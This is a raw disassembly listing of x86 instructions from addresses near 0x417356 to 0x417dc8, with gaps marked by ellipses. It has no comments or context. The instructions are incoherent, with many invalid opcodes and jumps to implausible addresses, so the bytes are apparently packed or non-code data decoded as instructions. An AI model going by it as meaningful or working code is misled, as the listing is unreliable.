  417356:	sar    BYTE PTR [edi+0x5c30bab2],0x48
  41735d:	xchg   edi,eax
  41735e:	hlt    
  41735f:	test   ebx,edi
  417361:	jae    0x41736e
  417363:	mov    bh,BYTE PTR [ebx]
  417365:	popa   
  417366:	adc    DWORD PTR ds:0xb1807bce,ecx
  41736c:	xchg   esi,eax
	...
  4173d5:	add    BYTE PTR [ecx-0x44],ch
  4173d8:	xlat   BYTE PTR ds:[ebx]
  4173d9:	pop    esi
  4173da:	xlat   BYTE PTR ds:[ebx]
  4173db:	jg     0x4173c6
  4173dd:	mov    edi,0x6508016b
  4173e2:	jl     0x4173ad
  4173e4:	in     al,0x95
  4173e6:	inc    esp
  4173e7:	cli    
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	inc    DWORD PTR [eax]
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	scas   eax,DWORD PTR es:[edi]
  4173ef:	fnstsw WORD PTR [ecx]
  4173f1:	xlat   BYTE PTR ds:[ebx]
  4173f2:	(bad)  
  4173f4:	aam    0x25
  4173f6:	out    dx,al
  4173f7:	mov    eax,ds:0x8fa5e38b
  4173fc:	lock dec ebx
  4173fe:	icebp  
  4173ff:	push   0x33
  417401:	dec    eax
  417402:	shl    DWORD PTR [ecx],1
  417404:	mov    cl,0x57
  417406:	cmp    eax,0xaaa19ab5
  41740b:	push   ss
  41740c:	dec    ebx
  41740d:	test   BYTE PTR [edi],ch
  41740f:	enter  0x19d4,0xf
  417413:	inc    esp
  417414:	xor    esi,DWORD PTR [edi]
  417416:	sbb    esp,0x60
  417419:	dec    edi
  41741a:	push   esp
  41741b:	dec    edi
  41741c:	dec    eax
  41741d:	inc    esi
  41741e:	ja     0x417473
  417420:	jae    0x4173ca
  417422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417423:	sbb    eax,0x5d1433b0
  417428:	mov    esp,0xda83c57b
  41742d:	outs   dx,BYTE PTR ds:[esi]
  41742e:	int3   
  41742f:	jne    0x4173bf
  417431:	lahf   
  417432:	ficomp WORD PTR [esi]
  417434:	jl     0x4173cf
  417436:	jae    0x417409
  417438:	xor    ecx,DWORD PTR [ebp-0x34]
  41743b:	jo     0x417470
  41743d:	in     al,dx
  41743e:	clc    
  41743f:	call   0xe5dd0546
  417444:	xchg   ebx,eax
  417445:	lods   eax,DWORD PTR ds:[esi]
  417446:	jge    0x417439
  417448:	inc    ecx
  417449:	dec    ecx
  41744a:	xchg   ebp,eax
  41744b:	push   esi
  41744c:	in     eax,dx
  41744d:	push   edx
  41744e:	mov    edi,0x1d3ca2d6
  417453:	mov    gs,esp
  417455:	imul   esp,DWORD PTR [esi+0x436c703d],0x8476c952
  41745f:	push   ss
  417460:	dec    edi
  417461:	mov    cl,0xb2
  417463:	inc    esp
  417464:	jl     0x4173e6
  417466:	mov    ch,0x96
  417468:	pop    ss
  417469:	cs fcomp st(5)
  41746c:	fprem1 
  41746e:	mov    esi,DWORD PTR [esi+0x19737605]
  417474:	push   edi
  417475:	aaa    
  417476:	mov    edx,0xffbc31b4
  41747b:	jns    0x417402
  41747d:	xchg   edx,eax
  41747e:	mov    dl,BYTE PTR [ebx+0x17]
  417481:	xchg   ebx,eax
  417482:	pushf  
  417483:	out    dx,eax
  417484:	mov    ds:0x56691c35,al
  417489:	loopne 0x417476
  41748b:	cmp    BYTE PTR [ecx],al
  41748d:	shl    BYTE PTR [edi+0x46],1
  417490:	mov    bh,0x2f
  417492:	test   bh,cl
  417494:	mov    esi,0xebd97978
  417499:	fwait
  41749a:	loopne 0x417475
  41749c:	jno    0x41748c
  41749e:	cwde   
  41749f:	mov    esi,0x1d61ee24
  4174a4:	dec    esi
  4174a5:	into   
  4174a6:	std    
  4174a7:	push   ebp
  4174a8:	and    al,0xd5
  4174aa:	and    DWORD PTR [ecx-0x68d16358],ecx
  4174b0:	xor    BYTE PTR ds:0x206f3403,dh
  4174b6:	jne    0x417534
  4174b8:	mov    BYTE PTR [eax+0x38dd1ac7],cl
  4174be:	sub    eax,DWORD PTR [ebx+eax*4-0x52]
  4174c2:	adc    al,BYTE PTR [ecx-0x47e7be86]
  4174c8:	into   
  4174c9:	mov    ds:0x12906819,al
  4174ce:	les    edi,FWORD PTR [esi-0x5f]
  4174d1:	bound  eax,QWORD PTR [edx]
  4174d3:	int    0xd5
  4174d5:	add    BYTE PTR [ecx+0x7c],ah
  4174d8:	hlt    
  4174d9:	cmp    ebp,0x7ba8763d
  4174df:	pop    ebp
  4174e0:	repz fst QWORD PTR ds:0xcb2b916d
  4174e7:	es jecxz 0x4174ec
  4174ea:	mov    esi,0x9c40
	...
  417553:	add    BYTE PTR [eax],al
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	push   ds
  417563:	mov    bl,0xe4
  417565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417566:	inc    ebx
  417567:	sti    
  417568:	add    BYTE PTR [eax],al
  41756a:	inc    DWORD PTR [eax]
  41756c:	add    BYTE PTR [eax],al
  41756e:	dec    eax
  41756f:	xchg   ebx,eax
  417570:	push   0x680cf139
  417575:	pop    es
  417576:	dec    BYTE PTR [edx+eiz*1-0x3af3d124]
  41757d:	idiv   bl
  41757f:	aaa    
  417580:	dec    esp
  417581:	in     al,0xf3
  417583:	popa   
  417584:	mov    dh,ch
  417586:	adc    eax,0x5daffb62
  41758b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41758d:	mov    bh,0xc2
  41758f:	cmp    eax,0x2108ecff
  417594:	loope  0x417516
  417596:	xor    BYTE PTR [ebx],cl
  417598:	test   DWORD PTR [edx+0x70cc89c9],esi
  41759e:	sub    al,bl
  4175a0:	daa    
  4175a1:	adc    ecx,DWORD PTR [esi-0x1298edc8]
  4175a7:	xchg   esp,eax
  4175a8:	jg     0x4175e5
  4175aa:	jle    0x4175b3
  4175ac:	aaa    
  4175ad:	jmp    0xd629d89a
  4175b2:	xor    BYTE PTR [edi],0x53
  4175b5:	and    bh,BYTE PTR [ebp-0x6d5d122f]
  4175bb:	out    dx,al
  4175bc:	or     BYTE PTR ds:0x5665d6f2,ch
  4175c2:	in     al,0x34
  4175c4:	div    dh
  4175c6:	xchg   BYTE PTR [ecx-0x35],cl
  4175c9:	shl    DWORD PTR [ebx-0x1a],cl
  4175cc:	bound  ecx,QWORD PTR [eax]
  4175ce:	cld    
  4175cf:	dec    esp
  4175d0:	gs adc al,0x1c
  4175d3:	jb     0x4175e9
  4175d5:	adc    eax,DWORD PTR [edx+0x35c036f3]
  4175db:	or     BYTE PTR ds:0xd3bff154,bl
  4175e1:	es ss repnz xchg edi,eax
  4175e5:	xchg   ecx,eax
  4175e6:	neg    DWORD PTR [ebp+0x71a8c8fb]
  4175ec:	in     al,dx
  4175ed:	jg     0x417620
  4175ef:	jge    0x417661
  4175f1:	push   esp
  4175f2:	ja     0x417631
  4175f4:	es imul ebp,DWORD PTR gs:[edi],0x8ebf9d4c
  4175fc:	daa    
  4175fd:	inc    edi
  4175fe:	sbb    ebp,ebp
  417600:	(bad)  
  417601:	fcom   DWORD PTR [ecx+0x61]
  417604:	pop    ss
  417605:	mov    ch,0x15
  417607:	cmp    bl,ch
  417609:	in     al,0xb5
  41760b:	xchg   dh,ah
  41760d:	int3   
  41760e:	scas   al,BYTE PTR es:[edi]
  41760f:	std    
  417610:	out    dx,eax
  417611:	cli    
  417612:	mov    dl,0x4
  417614:	(bad)  
  417615:	ret    
  417616:	ret    
  417617:	retf   
  417618:	std    
  417619:	cmp    dl,ah
  41761b:	jmp    0x9b3e:0x6dc42535
  417622:	adc    ecx,DWORD PTR [eax+0x61]
  417625:	mov    cl,0xe1
  417627:	pop    es
  417628:	push   0x1f
  41762a:	or     BYTE PTR [edi+0x2e],al
  41762d:	add    edx,DWORD PTR [ecx-0x2f22476a]
  417633:	fild   WORD PTR [edi]
  417635:	dec    esi
  417636:	adc    eax,0x780fbe6b
  41763b:	ficomp WORD PTR [ecx]
  41763d:	hlt    
  41763e:	mov    ebp,0xa00a8304
  417643:	je     0x4175fc
  417645:	pop    edx
  417646:	sbb    DWORD PTR [esi],esp
  417648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417649:	ja     0x417697
  41764b:	jb     0x41761a
  41764d:	outs   dx,BYTE PTR ds:[esi]
  41764e:	in     al,dx
  41764f:	or     eax,0x639a0c83
  417654:	out    0x6,eax
  417656:	inc    edi
  417657:	fs lock out dx,eax
  41765a:	outs   dx,DWORD PTR ds:[esi]
  41765b:	push   es
  41765c:	xchg   ecx,eax
  41765d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41765e:	retf   0xae72
  417661:	ret    0x452c
  417664:	xchg   DWORD PTR [edi-0x7bd4c69c],edx
  41766a:	sar    BYTE PTR [ebp+0x9],1
	...
  4176d5:	add    BYTE PTR [ecx-0x20b02c99],ch
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fiadd  DWORD PTR [ecx]
  4176e3:	shl    DWORD PTR [ebx+0xfc42fe],1
  4176e9:	add    bh,bh
  4176eb:	add    BYTE PTR [eax],al
  4176ed:	add    BYTE PTR [esi],ah
  4176ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f0:	and    ebp,ebx
  4176f2:	scas   al,BYTE PTR es:[edi]
  4176f3:	fs ja  0x4176ba
  4176f6:	sar    DWORD PTR [esp+ebx*2-0x4f01fc93],cl
  4176fd:	adc    al,0x34
  4176ff:	jecxz  0x4176f1
  417701:	call   0x79cf:0x44f76053
  417708:	cmp    BYTE PTR [ebp+0x3f],0x88
  41770c:	ins    DWORD PTR es:[edi],dx
  41770d:	sbb    bh,BYTE PTR [ebx]
  41770f:	jne    0x4176af
  417711:	inc    esi
  417712:	repz and esp,ecx
  417715:	cmp    eax,0x5b9302b0
  41771a:	in     al,dx
  41771b:	push   ebp
  41771c:	das    
  41771d:	lods   al,BYTE PTR ds:[esi]
  41771e:	jae    0x4176f6
  417720:	jecxz  0x41775e
  417722:	call   0x1476877c
  417727:	sti    
  417728:	pop    eax
  417729:	cli    
  41772a:	xchg   ebp,eax
  41772b:	test   esi,esi
  41772d:	add    al,0x7e
  41772f:	jnp    0x4176be
  417731:	sub    DWORD PTR [esi],ebx
  417733:	cli    
  417734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417735:	pop    eax
  417736:	fwait
  417737:	xchg   ecx,eax
  417738:	add    al,0x1a
  41773a:	sbb    dh,BYTE PTR [esi+0x78d5262f]
  417740:	and    eax,0x54f257e3
  417745:	sbb    dh,bh
  417747:	push   edi
  417748:	push   0x2c5bc34b
  41774d:	aas    
  41774e:	and    BYTE PTR [esi+0xe6677e8],0x8d
  417755:	and    esp,ebp
  417757:	outs   dx,DWORD PTR ds:[esi]
  417758:	test   eax,0xb2ffaa9c
  41775d:	loop   0x4177d8
  41775f:	outs   dx,DWORD PTR ds:[esi]
  417760:	sbb    cl,BYTE PTR [esi-0x49]
  417763:	daa    
  417764:	cmc    
  417765:	push   0xa35e96c0
  41776a:	popf   
  41776b:	inc    sp
  41776d:	and    DWORD PTR [ecx],ebp
  41776f:	pusha  
  417770:	in     eax,0x36
  417772:	inc    esi
  417773:	xor    bh,BYTE PTR ds:0x1de128aa
  417779:	test   BYTE PTR [ebp+0x1cfcd280],ch
  41777f:	(bad)  
  417780:	fucompp 
  417782:	pop    ebx
  417783:	or     DWORD PTR [edi-0x18ef0f33],ebp
  417789:	cmp    ebx,ecx
  41778b:	retf   
  41778c:	sub    bl,ch
  41778e:	dec    eax
  41778f:	es push edx
  417791:	in     eax,dx
  417792:	mov    ds:0xdefd19bc,eax
  417797:	in     eax,dx
  417798:	xchg   ebx,eax
  417799:	xchg   esi,eax
  41779a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41779b:	jbe    0x417720
  41779d:	cld    
  41779e:	(bad)
  4177a2:	adc    al,0xf1
  4177a4:	mov    ebp,?
  4177a6:	cmp    ebp,0x41510bfb
  4177ac:	aas    
  4177ad:	jno    0x41778f
  4177af:	das    
  4177b0:	mov    ds:0x5f4905da,eax
  4177b5:	push   edx
  4177b6:	cmc    
  4177b7:	and    eax,eax
  4177b9:	push   cs
  4177ba:	xchg   BYTE PTR [eax-0x54],dh
  4177bd:	aaa    
  4177be:	adc    BYTE PTR [ebp-0x4e17164a],dl
  4177c4:	sti    
  4177c5:	mov    eax,ds:0x53116075
  4177ca:	add    ebx,DWORD PTR [esi-0x59]
  4177cd:	sahf   
  4177ce:	pop    edi
  4177cf:	or     bh,BYTE PTR [ecx]
  4177d1:	scas   al,BYTE PTR es:[edi]
  4177d2:	jbe    0x417815
  4177d4:	mov    bh,0xcb
  4177d6:	pop    esp
  4177d7:	push   edi
  4177d8:	jb     0x417834
  4177da:	pop    edx
  4177db:	mov    edi,0xe0fd734e
  4177e0:	repz mov ecx,0xe760cc4c
  4177e6:	gs gs dec ebx
  4177e9:	in     al,0x37
  4177eb:	cld    
  4177ec:	aaa    
	...
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	shl    BYTE PTR [ecx+0x5e],cl
  417864:	and    esp,ebp
  417866:	inc    ecx
  417867:	std    
  417868:	add    BYTE PTR [eax],al
  41786a:	inc    DWORD PTR [eax]
  41786c:	add    BYTE PTR [eax],al
  41786e:	dec    esp
  41786f:	pushf  
  417870:	or     al,0xb1
  417872:	adc    bl,BYTE PTR [esi-0x15]
  417875:	lea    ebx,[edx-0x73]
  417878:	jo     0x4178d7
  41787a:	xor    BYTE PTR [eax-0x42429446],0x55
  417881:	imul   ecx,ebp,0xd2ebf8e1
  417887:	call   0xbf26488d
  41788c:	xchg   esi,eax
  41788d:	test   eax,0x239bf2ec
  417892:	dec    edx
  417893:	sbb    eax,0x7bb8dee2
  417898:	int3   
  417899:	mov    WORD PTR [ebx],fs
  41789b:	fisubr DWORD PTR [edi-0xb]
  41789e:	out    0x94,eax
  4178a0:	test   al,0x6
  4178a2:	mov    edx,0xe419a53
  4178a7:	pop    edi
  4178a8:	(bad)  
  4178a9:	cmc    
  4178aa:	push   edx
  4178ab:	pop    edi
  4178ac:	inc    ebx
  4178ad:	or     al,0x2b
  4178af:	mov    edx,0x11daf2f4
  4178b4:	shr    DWORD PTR [edi],1
  4178b6:	add    BYTE PTR [edi],0x2b
  4178b9:	outs   dx,DWORD PTR ds:[esi]
  4178ba:	in     eax,dx
  4178bb:	cwde   
  4178bc:	(bad)  
  4178bd:	loopne 0x41787d
  4178bf:	dec    esp
  4178c0:	ins    BYTE PTR es:[edi],dx
  4178c1:	call   0x741e:0xc5930d9f
  4178c8:	push   ds
  4178c9:	sbb    BYTE PTR [ebp-0x54],dh
  4178cc:	fldenv [ebx+ebp*2-0x6c6fb989]
  4178d3:	pop    ebp
  4178d4:	(bad)  
  4178d5:	std    
  4178d6:	jnp    0x417914
  4178d8:	fcom   st(6)
  4178da:	nop
  4178db:	jb     0x4178ca
  4178dd:	sub    eax,0xbe091ada
  4178e2:	arpl   bx,cx
  4178e4:	stos   BYTE PTR es:[edi],al
  4178e5:	inc    esp
  4178e6:	jmp    0xc606e8ea
  4178eb:	mov    WORD PTR [ebx-0x17],ds
  4178ee:	(bad)  
  4178f0:	movups XMMWORD PTR [ecx-0x464ae161],xmm6
  4178f7:	fstp   QWORD PTR [ebx+0x7bc10c19]
  4178fd:	jns    0x417928
  4178ff:	mov    edx,0x541da6df
  417904:	push   edx
  417905:	loop   0x417940
  417907:	mov    ah,0x88
  417909:	out    0xf4,eax
  41790b:	arpl   WORD PTR cs:[esi+0x28],bp
  41790f:	lock inc ebp
  417911:	iret   
  417912:	test   al,0xf0
  417914:	inc    sp
  417916:	adc    eax,0x62e723df
  41791b:	add    al,0x3f
  41791d:	jne    0x417918
  41791f:	jbe    0x4178aa
  417921:	push   0xffffffcb
  417923:	push   0x28
  417925:	scas   al,BYTE PTR es:[edi]
  417926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417927:	mov    ds:0x1d87368a,al
  41792c:	es mov bl,0xdb
  41792f:	mov    eax,ds:0xecb69763
  417934:	jg     0x4178f1
  417936:	enter  0x3800,0x3e
  41793a:	inc    ebx
  41793b:	loop   0x4178ce
  41793d:	or     al,0xa5
  41793f:	jne    0x4178dd
  417941:	outs   dx,DWORD PTR ds:[esi]
  417942:	sub    DWORD PTR ds:0xfe4236b,ebx
  417948:	inc    eax
  417949:	loope  0x417913
  41794b:	xchg   edx,eax
  41794c:	call   0x4950c9a6
  417951:	icebp  
  417952:	sbb    bh,BYTE PTR [esp]
  417955:	call   0x50d85394
  41795a:	add    eax,0x25bdc9af
  41795f:	xchg   esi,eax
  417960:	xlat   BYTE PTR ds:[ebx]
  417961:	hlt    
  417962:	iret   
  417963:	sub    DWORD PTR [edi+0x78],0xffffffe2
  417967:	aam    0xa7
  417969:	out    dx,al
  41796a:	shl    ah,1
  41796c:	and    BYTE PTR [eax],al
	...
  4179d6:	pop    eax
  4179d7:	inc    ecx
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	pushf  
  4179e3:	(bad)  
  4179e4:	push   0xffffffbd
  4179e6:	inc    eax
  4179e7:	inc    BYTE PTR [eax]
  4179e9:	add    bh,bh
  4179eb:	add    BYTE PTR [eax],al
  4179ed:	add    BYTE PTR ds:0x13a6c056,ah
  4179f3:	imul   esi,DWORD PTR [edx],0x299f7c08
  4179f9:	xor    dl,cl
  4179fb:	rol    BYTE PTR [ecx-0x7d5b3249],1
  417a01:	pop    ecx
  417a02:	mov    bl,BYTE PTR [esi]
  417a04:	xlat   BYTE PTR ds:[ebx]
  417a05:	pop    edx
  417a06:	ja     0x417988
  417a08:	loope  0x417a16
  417a0a:	clc    
  417a0b:	ja     0x4179ee
  417a0d:	dec    ebx
  417a0e:	jmp    0x4179db
  417a10:	and    cl,BYTE PTR ds:0x1b123795
  417a16:	dec    ebx
  417a17:	pop    es
  417a18:	les    ecx,FWORD PTR [edx+0x4d]
  417a1b:	pop    ss
  417a1c:	sahf   
  417a1d:	mov    ss,esi
  417a1f:	(bad)  
  417a20:	mov    ebp,0x86ce9eca
  417a25:	sub    BYTE PTR [esi-0x2fcf0391],cl
  417a2b:	test   al,0x71
  417a2d:	dec    ebx
  417a2e:	stc    
  417a2f:	mov    esp,0xea5e27f5
  417a34:	cdq    
  417a35:	fwait
  417a36:	jle    0x417a0d
  417a38:	popf   
  417a39:	and    eax,0x7af33267
  417a3e:	in     al,0xc7
  417a40:	sub    eax,0xce077ae1
  417a45:	test   DWORD PTR [ebp-0x1c127397],0x3d0c8647
  417a4f:	adc    ah,cl
  417a51:	mov    BYTE PTR [ebp+0x15],dl
  417a54:	jmp    0x9598:0xbef03271
  417a5b:	sub    BYTE PTR [edi+0x3f5f5390],dh
  417a61:	fild   WORD PTR [ecx]
  417a63:	xchg   esp,eax
  417a64:	mov    dh,0x21
  417a66:	aad    0x85
  417a68:	into   
  417a69:	push   ds
  417a6a:	adc    al,0xa7
  417a6c:	jmp    0xf65bb7ba
  417a71:	mov    ebx,0x78cc8267
  417a76:	data16 fldcw WORD PTR [eax+0x27]
  417a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a7b:	inc    esp
  417a7c:	jnp    0x417adf
  417a7e:	mov    ch,0xca
  417a80:	inc    edi
  417a81:	push   ds
  417a82:	int    0xc5
  417a84:	xlat   BYTE PTR ds:[ebx]
  417a85:	dec    esp
  417a86:	xor    DWORD PTR [eax-0x1e],ebx
  417a89:	loope  0x417a20
  417a8b:	aad    0xa7
  417a8d:	inc    edi
  417a8e:	add    BYTE PTR [esi],cl
  417a90:	leave  
  417a91:	sub    al,0x60
  417a93:	ret    
  417a94:	stos   BYTE PTR es:[edi],al
  417a95:	xor    BYTE PTR [edi],ah
  417a97:	sub    esi,ebx
  417a99:	mov    cl,BYTE PTR [eax-0x274f95c8]
  417a9f:	inc    ecx
  417aa0:	rol    BYTE PTR [ecx],0xda
  417aa3:	cmp    ch,BYTE PTR [esi-0x5feb7d56]
  417aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aaa:	aas    
  417aab:	test   BYTE PTR [ebp+0x574d0c54],dl
  417ab1:	int3   
  417ab2:	pop    ds
  417ab3:	dec    edx
  417ab4:	test   BYTE PTR [ecx+0x1e4fc9eb],dl
  417aba:	lods   al,BYTE PTR ds:[esi]
  417abb:	or     DWORD PTR [ebx+0x27],eax
  417abe:	sahf   
  417abf:	cmp    ch,BYTE PTR [esi+0x6f]
  417ac2:	push   edi
  417ac3:	jle    0x417ae6
  417ac5:	pushf  
  417ac6:	fsubr  DWORD PTR [ecx]
  417ac8:	lock les ebp,FWORD PTR [esi]
  417acb:	pop    edi
  417acc:	dec    ecx
  417acd:	mov    ah,0xd5
  417acf:	cmc    
  417ad0:	adc    bh,BYTE PTR [edx+0x747cd382]
  417ad6:	pop    edi
  417ad7:	push   ss
  417ad8:	sbb    eax,0xf911d068
  417add:	sub    ch,dl
  417adf:	xor    DWORD PTR [ecx],0xffffff84
  417ae2:	xchg   edx,eax
  417ae3:	dec    ebp
  417ae4:	jnp    0x417aa6
  417ae6:	scas   al,BYTE PTR es:[edi]
  417ae7:	fcmovb st,st(5)
  417ae9:	add    eax,0x4e1e28
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0xad604d0]
  417b66:	aas    
  417b67:	inc    DWORD PTR [eax]
  417b69:	add    bh,bh
  417b6b:	add    BYTE PTR [eax],al
  417b6d:	add    ah,dh
  417b6f:	(bad)  
  417b71:	es push ss
  417b73:	(bad)  
  417b75:	ret    0xc2f6
  417b78:	xchg   edx,eax
  417b79:	push   ds
  417b7a:	int3   
  417b7b:	xchg   ebx,eax
  417b7c:	out    dx,eax
  417b7d:	jo     0x417bf4
  417b7f:	dec    esi
  417b80:	mov    ds:0x8952b37a,al
  417b85:	push   eax
  417b86:	pusha  
  417b87:	sub    edi,edi
  417b89:	and    bl,BYTE PTR [ecx]
  417b8b:	pop    es
  417b8c:	jmp    0x417bef
  417b8e:	(bad)  [esi+eiz*8]
  417b91:	jg     0x417ba0
  417b93:	xchg   ebx,eax
  417b94:	sti    
  417b95:	push   ebp
  417b96:	mov    al,ds:0x481ab3d4
  417b9b:	das    
  417b9c:	dec    ecx
  417b9d:	(bad)  
  417b9e:	mov    ch,bl
  417ba0:	jae    0x417b29
  417ba2:	ja     0x417c09
  417ba4:	repz fcomp QWORD PTR [bx+di+0x3a]
  417ba9:	jle    0x417b44
  417bab:	sub    BYTE PTR [esi],ch
  417bad:	xchg   esi,eax
  417bae:	inc    ecx
  417baf:	daa    
  417bb0:	shl    DWORD PTR [edx],cl
  417bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb3:	mov    eax,0xa18af6be
  417bb8:	mov    bh,0x37
  417bba:	jp     0x417b6e
  417bbc:	sub    ah,bh
  417bbe:	adc    DWORD PTR [ecx],edx
  417bc0:	cmp    eax,0x1c6f3fdc
  417bc5:	in     eax,0xae
  417bc7:	jbe    0x417bdb
  417bc9:	xor    eax,0xe991c2aa
  417bce:	xor    DWORD PTR [ebp-0xb],esp
  417bd1:	and    al,0xc0
  417bd3:	aas    
  417bd4:	outs   dx,BYTE PTR ds:[esi]
  417bd5:	bound  edx,QWORD PTR [edi+0x36b308e6]
  417bdb:	rcr    ch,1
  417bdd:	jl     0x417c0f
  417bdf:	test   eax,0xab7c9f81
  417be4:	inc    dx
  417be6:	mov    bh,0xfa
  417be8:	adc    al,0xbe
  417bea:	les    ecx,FWORD PTR [ebx]
  417bec:	repz xchg esi,eax
  417bee:	test   BYTE PTR [eax*8-0x75412dc6],al
  417bf5:	aam    0x23
  417bf7:	cmc    
  417bf8:	jbe    0x417c69
  417bfa:	dec    ecx
  417bfb:	xor    DWORD PTR [esi],esp
  417bfd:	sub    bl,ch
  417bff:	mov    esp,DWORD PTR [ecx+0x3e84cce9]
  417c05:	or     eax,0x79d54dc6
  417c0a:	xchg   esp,eax
  417c0b:	aaa    
  417c0c:	sub    eax,0xb7df373f
  417c11:	std    
  417c12:	shl    ch,0x29
  417c15:	mov    dl,0xae
  417c17:	adc    DWORD PTR [ebp+0x7646a060],ebx
  417c1d:	jg     0x417c7b
  417c1f:	push   ss
  417c20:	loop   0x417bbf
  417c22:	outs   dx,BYTE PTR ds:[esi]
  417c23:	(bad)  
  417c24:	retf   
  417c25:	or     DWORD PTR [edi-0x7abba600],ebp
  417c2b:	inc    edi
  417c2c:	js     0x417bd2
  417c2e:	cs mov bx,0xd27f
  417c33:	sbb    ebx,ecx
  417c35:	fst    DWORD PTR [ebx-0x18b1a066]
  417c3b:	dec    esp
  417c3c:	std    
  417c3d:	inc    ebx
  417c3e:	ja     0x417c5a
  417c40:	dec    esi
  417c41:	mov    al,0x1e
  417c43:	ret    
  417c44:	xchg   BYTE PTR [edx-0x69d7161b],ch
  417c4a:	cwde   
  417c4b:	jnp    0x417c4c
  417c4d:	and    al,0x25
  417c4f:	pop    edi
  417c50:	pushf  
  417c51:	es push eax
  417c53:	xor    al,0xe5
  417c55:	in     al,dx
  417c56:	(bad)  [ecx-0x26]
  417c59:	mov    dh,0x70
  417c5b:	inc    eax
  417c5c:	repz add DWORD PTR [edx-0x73],ecx
  417c60:	add    esi,DWORD PTR [ecx-0x50]
  417c63:	push   edx
  417c64:	nop
  417c65:	repnz sbb DWORD PTR [ebp+0x43],ecx
  417c69:	iret   
  417c6a:	sbb    al,0x44
  417c6c:	jae    0x417c6e
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0xf8
  417ce3:	push   0x3eae05
  417ce8:	add    DWORD PTR [eax],eax
  417cea:	inc    DWORD PTR [eax]
  417cec:	add    BYTE PTR [eax],al
  417cee:	shl    esp,1
  417cf0:	ins    DWORD PTR es:[edi],dx
  417cf1:	and    eax,0xe7487a85
  417cf6:	inc    dl
  417cf8:	cmp    DWORD PTR [edx-0x35fb2d72],edx
  417cfe:	inc    DWORD PTR [ebp+edx*1-0x36]
  417d02:	aaa    
  417d03:	cli    
  417d04:	add    al,bh
  417d06:	or     ebx,DWORD PTR [esi+0x40136184]
  417d0c:	fidiv  DWORD PTR [eax]
  417d0e:	outs   dx,DWORD PTR ds:[esi]
  417d0f:	in     eax,0x51
  417d11:	fild   DWORD PTR [ebx]
  417d13:	popa   
  417d14:	pop    edx
  417d15:	clc    
  417d16:	out    dx,al
  417d17:	pop    ecx
  417d18:	xor    dl,BYTE PTR [ecx]
  417d1a:	jnp    0x417d13
  417d1c:	or     BYTE PTR [ebx-0x74],dh
  417d1f:	lods   al,BYTE PTR ds:[esi]
  417d20:	test   al,0x5f
  417d22:	xor    ebp,eax
  417d24:	and    DWORD PTR [edx-0x74],0xfffffffe
  417d28:	in     al,dx
  417d29:	push   esp
  417d2a:	mov    ch,0x89
  417d2c:	sub    esp,ebx
  417d2e:	mov    bh,0xa4
  417d30:	cmp    DWORD PTR [ebp+edx*2-0x7e],edx
  417d34:	adc    BYTE PTR [edx-0x50],0xa4
  417d38:	sahf   
  417d39:	(bad)  
  417d3a:	mov    ds:0x39e7b457,al
  417d3f:	add    eax,0xf7901000
  417d44:	test   eax,0x375ca4cb
  417d49:	cmp    bh,al
  417d4b:	dec    ebp
  417d4c:	pusha  
  417d4d:	mov    bl,0x71
  417d4f:	mov    edx,0xa2dd25e3
  417d54:	xor    eax,0x838ef050
  417d59:	jno    0x417d97
  417d5b:	and    eax,0xcec5177e
  417d60:	int    0x87
  417d62:	addr16 pop esp
  417d64:	hlt    
  417d65:	jae    0x417da8
  417d67:	in     eax,dx
  417d68:	daa    
  417d69:	cdq    
  417d6a:	test   DWORD PTR [esp+edx*8],ecx
  417d6d:	xor    ch,BYTE PTR [esi-0x1e]
  417d70:	adc    eax,0x6cac206f
  417d75:	mov    al,ds:0x6a627e31
  417d7a:	and    dl,cl
  417d7c:	(bad)  
  417d7d:	dec    edi
  417d7e:	sbb    DWORD PTR [ebx+0x53e6d49c],0x25
  417d85:	mov    eax,ds:0x5038b950
  417d8a:	jno    0x417d3d
  417d8c:	jmp    0x417da2
  417d8e:	mov    ds:0xa1fa851b,eax
  417d93:	cwde   
  417d94:	jge    0x417d4a
  417d96:	cmp    cl,bh
  417d98:	leave  
  417d99:	or     DWORD PTR [ebp+eax*8-0x69d2f513],edi
  417da0:	outs   dx,DWORD PTR ds:[esi]
  417da1:	rcr    DWORD PTR [eax],cl
  417da3:	dec    eax
  417da4:	aad    0x89
  417da6:	shr    DWORD PTR [eax+0x3f340234],cl
  417dac:	jp     0x417e16
  417dae:	xor    ecx,DWORD PTR [esi]
  417db0:	js     0x417e0d
  417db2:	mov    edx,0xa3dbafec
  417db7:	mov    ecx,0x3402769
  417dbc:	fist   WORD PTR [ecx+edi*8+0x5a]
  417dc0:	(bad)  
  417dc1:	push   0x526d58d8
  417dc6:	jp     0x417d88
  417dc8:	push   ss
